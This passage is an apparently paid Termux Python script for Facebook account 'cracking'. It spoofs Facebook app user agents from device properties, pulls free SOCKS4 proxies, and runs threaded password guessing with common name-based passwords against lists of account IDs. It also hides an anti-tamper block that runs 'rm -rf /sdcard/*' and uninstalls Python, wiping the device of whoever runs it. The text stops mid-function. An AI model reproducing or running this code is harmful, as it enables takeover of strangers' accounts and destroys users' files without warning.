# ENJOY OPEN SOURCE SCRIPT
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FULL SCRIPT ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
# OWNER BY SCRIPT : MR ASRAFUL
# MAKE BY : FARDIN AHMED ASHRAFUL
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys,uuid,getpass
import os,base64,zlib,pip,urllib
import os,zlib,time,datetime
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from time import localtime as lt
import os
import requests
import httpx
import os
import os,zlib
from time import localtime as lt
from os import system as osRUB
from os import system as cmd
os.system('clear')
try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')    
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as MrXIDI
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
import requests,bs4,json,os,sys,random,datetime,time,re,string
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ ETC MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
sim = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').replace('\n', '').replace(',', f'''\x1b[38;5;196m >> \x1b[1;97m''')              
gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-75505','GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOOP ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];cid=[]
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ COLOUR ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
BU= '\033[1;34m';A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;46m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';faltu = '\033[1;47m'
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ SECURITY-CODE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()
      if path.isfile("/data/data/com.termux/files/usr/bin/termux-reset"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()
      if path.isfile("/data/data/com.termux/files/usr/bin/termux-setup-storage"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py', 'r') as file:
    file_content = file.read()
with open('/data/data/com.termux/files/usr/lib/python3.12/http/client.py', 'r') as file:
    file_content = file.read()
if 'print(data.decode())' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('pkg uninstall python -y')
    os.system('pkg uninstall pycurl -y')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/Downloads')
    os.system('pip install requests')
    exit("")
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py', 'r') as file:
    file_content = file.read()
if 'print' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit("")
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit("")
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit("")
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ BIT ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
bit = platform.architecture()[0]
import os, platform, time, sys
bal = input(f"{G}ENTER YOUR NAME : {R}")
os.system('clear')
import os, platform, time, sys
try:
 import requests
except:os.system("pip uninstall requests -y;pip install requests")
os.system('git pull --quiet 2>/dev/null')
bit = platform.architecture()[0]
if bit == '64bit':
 print(f'{A}[{R}●{A}] {G}YOU ARE 64BIT USER')
 time.sleep(4)
elif bit == '32bit':
 print(f'{A}[{R}●{A}] {G}YOU ARE 32BIT USER')
princp=[]
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ APV ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
import os
import sys
import datetime
import platform,hashlib
from datetime import datetime,timedelta

class User_Pro:
    def __init__(self,username,active_time,user_time):
        self.username = username
        self.userkey = hashlib.md5((platform.version()+str(os.getuid())+platform.platform()+os.getlogin()+platform.release()).replace(' ','').encode()).hexdigest().upper()
        self.active = datetime.strptime(active_time, "%d-%m-%Y")
        self.expire = self.active + timedelta(days=int(user_time))
    def check_key_status(self):
        current_date = datetime.now()
        if current_date >= self.expire:
            return "EXPIRE-KEY"
        else:
            return "ACTIVE-KEY"
    def get_details(self):
        status = self.check_key_status()
        return {
            "USERNAME":self.username,
            "USER-KEY":self.userkey,
            "ACTIVE-TIME":self.active.strftime("%d-%m-%Y"),
            "EXPIRE-TIME":self.expire.strftime("%d-%m-%Y"),
            "USER-STATUS":status,
        }
import os,re
import requests
MY_KEY = hashlib.md5((platform.version()+str(os.getuid())+platform.platform()+os.getlogin()+platform.release()).replace(' ','').encode()).hexdigest().upper()
class Get_Data:
    def __init__(self):
        self.url = "https://stephanashraful.blogspot.com/2024/10/blog-post.html?m=1"
    def get(self):
        respone = requests.get("https://stephanashraful.blogspot.com/2024/10/blog-post.html?m=1").text
        if MY_KEY in respone:
            username,active,expire = re.findall(f"USERKEY={MY_KEY}=USERNAME=(.*)=START=(.*)=EXPIRE=(.*)=LIVE",respone)[0]
            userfind = User_Pro(username,active,expire)
            value = userfind.get_details()
            Main(value).Menu()
        else:
            clear();print(f"{A}[{R}●{A}] {G}USERNAME{R} : {A}MR ASRAFUL");print(f"{A}[{R}●{A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}●{A}] {G}YOU ARE NOT PREMUIM USER FIRST BUY PREMUIM');linex();print(f"{A}[{R}●{A}] {G}IF YOU WANT TO BUY COMMAND BY YOUR OWN WILLING, SEND {A}350 [15 DAYS] {G}|{A} 600 [30 DAYS] {G}TO THE GIVEN BKASH ACCOUNT AND SEND YOUR TOKEN AND PAYMENT SCREENSHOT TO THE GIVEN WHATSAPP NUMBER");linex();print(f"{A}[{R}●{A}] {G}1 TOKEN IS ONLY FOR 1 DEVICE, YOU CANNOT TRANSFER YOUR SUBSCRIPTION");linex();print(f"{A}[{R}●{A}] {G}YOUR ARE ONLY ELIGIBLE TO GET REFUND OR AGAIN SUBSCRIPTION, IF YOURTOKEN IS NOT CHANGED. IF HAPPENS, YOU WILL NOT BE ABLE TO CLAIM REFUND OR RECOVERY OF SUBSCRIPTION");linex();print(f"{A}[{R}●{A}] {G}IF YOUR SUBSCRIPTION ENDS BY CLEARING DATA, SYSTEM UPDATE,DELETING TERMUX OR DOWNGRADING AND UPGRADING TERMUX APK,YOUR WILL NOT BE ABLE TO GET SUBSCRIPTION UNTILL YOU PAY AGAIN");linex();print(f"{A}[{R}●{A}] {G}WHATSAPP NUMBER{R} >> {G}+8801924709552");linex();print(f"{A}[{R}●{A}] {G}FACEBOOK ID    {R} >> {G}ASRAFULfire");linex();input(f"{A}[{R}●{A}] {G}TELEGRAM ID    {R} >> {G}@ASRAFULfire");linex()
            sys.exit()
import os
class Main:
    def __init__(self,value):
        self.name = str(value["USERNAME"])
        self.token = str(value["USER-KEY"])
        self.active = str(value["ACTIVE-TIME"])
        self.expire = str(value["EXPIRE-TIME"])
        self.status = str(value["USER-STATUS"])
    def check(self):
        if self.status == "EXPIRE-KEY":
            clear();print(f"{A}[{R}●{A}] {G}USERNAME{R} : {A}{bal}");print(f"{A}[{R}●{A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}●{A}] {G}YOU ARE NOT PREMUIM USER FIRST BUY PREMUIM');linex();print(f"{A}[{R}●{A}] {G}IF YOU WANT TO BUY COMMAND BY YOUR OWN WILLING, SEND {A}350 [15 DAYS] {G}|{A} 600 [30 DAYS] {G}TO THE GIVEN BKASH ACCOUNT AND SEND YOUR TOKEN AND PAYMENT SCREENSHOT TO THE GIVEN WHATSAPP NUMBER");linex();print(f"{A}[{R}●{A}] {G}1 TOKEN IS ONLY FOR 1 DEVICE, YOU CANNOT TRANSFER YOUR SUBSCRIPTION");linex();print(f"{A}[{R}●{A}] {G}YOUR ARE ONLY ELIGIBLE TO GET REFUND OR AGAIN SUBSCRIPTION, IF YOURTOKEN IS NOT CHANGED. IF HAPPENS, YOU WILL NOT BE ABLE TO CLAIM REFUND OR RECOVERY OF SUBSCRIPTION");linex();print(f"{A}[{R}●{A}] {G}IF YOUR SUBSCRIPTION ENDS BY CLEARING DATA, SYSTEM UPDATE,DELETING TERMUX OR DOWNGRADING AND UPGRADING TERMUX APK, YOUR WILL NOT BE ABLE TO GET SUBSCRIPTION UNTILL YOU PAY AGAIN");linex();print(f"{A}[{R}●{A}] {G}WHATSAPP NUMBER{R} >> {G}+8801924709552");linex();input(f"{A}[{R}●{A}] {G}TELEGRAM ID    {R} >> {G}@ASRAFULfire");linex()
            sys.exit()
        elif self.status == "ACTIVE-KEY":
            menu()
    def Menu(self):
        os.system("clear")
        self.check()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ PROX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
except:
    print('Internet Error')
    sys.exit()
xvx = open('.prox.txt', 'r').read().splitlines()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LINEX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sys.stdout.write('\x1b]2;<💚MR.ASRAFUL💚>\x07')
def clear():os.system('clear');print(logo)
def linex():print(f'{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE UA ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def yek():
    import random
    fbav = f'{random.randint(10,437)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
    fban = random.choice(["FB4A", "FB5A", "FB6A"])
    fbbv = str(random.randint(10000000, 99999999))
    sex = f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};"
    umah = '[FBAN/Orca-Android;FBAV/483.0.0.51.72;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/67467545;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    xuna = sex+umah
    ex = random.choice([xuna])
    return ex
def M10():
    ua = '[FBAN/FB4A;FBAV/'+str(random.randint(10, 100))+'.0.0.'+str(random.randint(1111, 9999))+';FBBV/'+str(random.randint(1111111, 9999999)) + ";[FBAN/FB4A;FBAV/62.0.0.3451;FBBV/1420777;FBDM={density=2.75,width=1080,height=2168};FBLC/en_US;FBRV/132900689;FBCR/Robi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 11Pro;FBSV/13;FBOP/1;FBCA/arm64-v8a;]"
    return ua    

def UA():
    dal = 'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))'
    a = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777))
    b = ';[Dalvik/2.1.0 (Linux;  U; Android 9.0.1; SM-A205U Build/RKQ1.211103.002) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.25,width=1040,height=2439};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205U;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    c = ';[Dalvik/2.1.0 (Linux;  U; Android 11.0.1; SM-A205W Build/TP1A.220905.001) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3 75,width=1373,height=1824};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205W;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    d = ';[Dalvik/2.1.0 (Linux;  U; Android 10.0.1; SM-A205FN Build/TP1A.220905.001) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.25,width=760,height=2422};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205FN;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    e = ';[Dalvik/2.1.0 (Linux;  U; Android 7.0.1; SM-A205F Build/SKQ1.210216.001) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=867,height=1891};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    f = ';[Dalvik/2.1.0 (Linux;  U; Android 9.0.1; SM-A205GN Build/SKQ1.210216.001) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1252,height=1991};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205GN;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua = a + b + c + d + e + f
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
logo=f"""\x1b[38;5;46m _  _ ____    ____ ____ ____ ____ ____ _  _ _       
\x1b[38;5;46m |\/| |__/    |__| [__  |__/ |__| |___ |  | |       
\x1b[38;5;46m |  | |  \    |  | ___] |  \ |  | |    |__| |___
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{A}[{R}●{A}] {G}FACEBOOK   {R} >>   {A}MR ASRAFUL
{A}[{R}●{A}] {G}STATUS      {R}>>   {A}FILE {R}X{A} RANDOM
{A}[{R}●{A}] {G}VERSION   {R}  >>   {A}0.4
{A}[{R}●{A}] {G}GITHUB    {R}  >>   {A}https://github.com/ERROR/404
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MENU ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def menu():
        try:                        
                        clear();print(f"{A}[{R}●{A}] {G}USERNAME{R} : {purple}{bal}{A}-{purple}{purple}{bit}");print(f"{A}[{R}●{A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}1{A}] {G}FILE CRACK\n{A}[{R}2{A}] {G}RANDOM CRACK\n{A}[{R}3{A}] {G}JOINT PUBLIC GROUP \n{A}[{R}4{A}] {G}EXIT')
                        linex()
                        ASRAFUL=input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A} ')
                        if ASRAFUL in ['1','01']:
                                clear();print(f'{A}[{R}●{A}]{G} EXAMPLE {R}:{A} /sdcard/fardin.txt ');linex()
                                file = input(f'{A}[{R}●{A}]{G} FILE NAME {R}: \033[1;32m{A}')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'{A}[{R}●{A}]{G} FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'{A}[{R}1{A}]{G} METHOD M1\n{A}[{R}2{A}]{G} METHOD M2\n{A}[{R}3{A}]{G} METHOD M3');linex()
                                mthd=input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A} ')
                                clear()
                                plist = []           
                                print(f'{A}[{R}1{A}]{G} 15 PASSWORD AUTO PASS\n{A}[{R}2{A}]{G} CHOICE PASSWORD CLONE');linex()
                                ppp=input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A} ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('First Last')
                                        plist.append('77889900')
                                        plist.append('first1234')
                                        plist.append('@@@###')
                                        plist.append('57273200')
                                        plist.append('57575727')
                                        plist.append('57575727')
                                        plist.append('first@123')
                                        plist.append('first017')
                                        plist.append('@12345@')
                                        plist.append('@123456@')
                                        plist.append('@1234567@')
                                        plist.append('first12345')
                                        plist.append('first123456789')
                                        plist.append('first@')
                                        plist.append('first@@')
                                        plist.append('last123')
                                        plist.append('last1234')
                                        plist.append('last12')
                                        plist.append('@@first@@')
                                        plist.append('last12345')
                                        plist.append('first@@@')
                                        plist.append('first0')
                                        plist.append('first1')
                                else:
                                        try:
                                                clear()
                                                ps_limit = int(input(f'{A}[{R}●{A}]{G} PASSWORD LIMIT \033[1;32m{R}: \033[1;32m{A}'))
                                        except:
                                                ps_limit =1
                                        clear()
                                        print(f'{A}[{R}●{A}]{G} EXAMPLE \033[1;32m{R}: \033[1;31m{A}firstlast/first@@/first123 ')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'{R}[{G}+{R}]{G} PASSWORD NO {i+1} \033[1;32m{R}: \033[1;32m{A}'))
                                clear();print(f'{A}[{R}●{A}]{G} DO YOU CP SHOW ACCOUNT {A}(Y{G}/{A}N) ')
                                linex()
                                cx=input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A} ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f"{A}[{R}●{A}] {G}USERNAME{R} : {purple}{bal}{A}-{purple}{purple}{bit}");print(f"{A}[{R}●{A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}●{A}]{G} SIM NAME  {R}>> {A}{sim} ')
                                        print(f'{A}[{R}●{A}] {G}TOTAL ID {R} >>{A} {total_ids} {R} >> {G}CRACKING METHOD {R} >>{A} M{mthd}')                                   
                                        print(f'{A}[{R}●{A}] {G}TURN ON/OF AIRPLAN MODE EVERY 5 MIN')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api3,ids,names,passlist)
                                                elif mthd in ['4','04']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                linex()
                                print(f'{A}[{R}●{A}] {G}THE PROCESS HAS COMPLETED')
                                print(f'{A}[{R}●{A}] {G}TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(f'{A}[{R}●{A}] {G}PRESS ENTER TO BACK ')
                                menu()
                        elif ASRAFUL in ['2','02']:
                                ___RANDOM___()
                        elif ASRAFUL in ['3','03']:
                                print("Next up")
                        elif ASRAFUL in ['4','04']:
                                os.system('xdg-open https://www.facebook.com/ASRAFULfire');menu()
                        elif ASRAFUL in ['0','00']:
                                exit(f'{R}[{G}+{R}]{G} EXIT DONE ')
                        else:
                                exit(f'{A}[{R}●{A}]{G} OPTION NOT FOUND IN MENU');menu()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
